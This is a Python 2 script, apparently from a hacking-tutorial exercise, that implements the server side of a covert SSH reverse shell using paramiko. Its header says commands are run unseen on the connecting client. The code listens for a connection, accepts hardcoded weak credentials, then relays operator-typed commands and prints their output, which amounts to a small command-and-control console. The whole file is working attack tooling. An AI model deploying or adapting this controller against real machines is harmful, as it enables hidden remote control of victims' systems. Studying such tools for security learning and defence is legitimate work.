####################################################################
#
# SSH Server, who accepts connection from ssh client, and send command back to client.
# We don’t see anything in the SSH client, but the command we sent is executed on the client,
# and the output is sent to our SSH server .
#
####################################################################


import socket
import paramiko
import threading
import sys


class Server(paramiko.ServerInterface):

    def __init__(self):
        self.event = threading.Event()

    def check_channel_request(self, kind, chanid):
        if kind == 'session':
            return paramiko.OPEN_SUCCEEDED
        return paramiko.OPEN_FAILED_ADMINISTRATIVELY_PROHIBITED

    def check_auth_password(self, username, password):
        if (username == 'wengyan') and (password == '123456'):
            return paramiko.AUTH_SUCCESSFUL
        return paramiko.AUTH_FAILED


def sshServer(ssh_hostname, ssh_port):
    # start a socket listener
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        # the SO_REUSEADDR flag tells the kernel to reuse a local socket in TIME_WAIT state,
        # without waiting for its natural timeout to expire.
        # https://docs.python.org/2/library/socket.html
        sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        sock.bind((ssh_hostname, ssh_port))
        sock.listen(100)
        print("[+] Listening for connection ...")
        client, addr = sock.accept()
    except Exception, e:
        print ("[-] Listen failed: " + str(e))
        sys.exit(1)
    print("[+] Got a connection!")

    # SSHinize it
    try:
        bhSession = paramiko.Transport(client)
        # When behaving as a server, the host key is used to sign certain packets during the SSH2 negotiation,
        # so that the client can trust that we are who we say we are.
        host_key = paramiko.RSAKey(filename='keys/test_rsa.key')
        bhSession.add_server_key(host_key)
        server = Server()

        try:
            # Negotiate a new SSH2 session as a server.
            # This is the first step after creating a new Transport and setting up your server host key(s).
            # A separate thread is created for protocol negotiation.
            bhSession.start_server(server=server)
        except paramiko.SSHException, x:
            print("[-] SSH negotiation failed.")

        chan = bhSession.accept(20)
        print("[+] Authenticated!")
        print(chan.recv(1024))
        chan.send('Welcome to bh_ssh Server')
        while True:
            try:
                command = raw_input("Enter command: ").strip('\n')
                if command != 'exit':
                    chan.send(command)
                    print(chan.recv(1024) + "\n")
                else:
                    chan.send('exit')
                    print("exiting")
                    bhSession.close()
                    exit(0)
            except KeyboardInterrupt:
                bhSession.close()
                raise Exception('exit')
    except Exception, e:
        print("[-] Caught exception: " + str(e))
        try:
            bhSession.close()
        except:
            pass
        sys.exit(1)


if __name__ == '__main__':

    if len(sys.argv) == 3:
        print 'Starting SSH Server'
        ssh_hostname = sys.argv[1]
        ssh_port = int(sys.argv[2])
        sshServer(ssh_hostname, ssh_port)

    else:
        print " Usage: python bh_sshServer.py sshServer_hostname sshServer_port"
        exit(1)
